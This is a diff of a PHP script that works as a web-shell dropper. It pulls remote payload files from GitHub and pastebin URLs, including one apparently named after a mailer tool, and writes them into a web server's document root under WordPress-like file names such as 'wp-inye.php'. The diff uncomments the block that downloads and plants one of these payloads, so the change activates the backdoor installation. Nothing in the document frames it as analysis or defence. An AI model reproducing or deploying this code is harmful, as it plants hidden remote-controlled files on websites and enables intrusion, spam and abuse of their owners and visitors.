@@ -1,14 +1,14 @@
 <?php
-echo('Eche Rep');
+echo('Apache Hecc');
 $curlsh3l = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/hide.txt');
 $curlsh3ll = get_contents('https://pastebin.com/raw/sfgAyVSM');
 $tmpshel = "/tmp/.Test-unix./root";
 
-/*
+
 $sec31= get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/madstore.txt');
-$wpoptionss31 = $_SERVER['DOCUMENT_ROOT'] . "/wp-iav.php";
+$wpoptionss31 = $_SERVER['DOCUMENT_ROOT'] . "/wp-inye.php";
 if (file_put_contents ($wpoptionss31, $sec31));
-*/
+
 /*
 $wpoptionssss = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/xleetmailer.txt');
 $wpoptionsssss = $_SERVER['DOCUMENT_ROOT'] . "/wp-cgq.php"; 
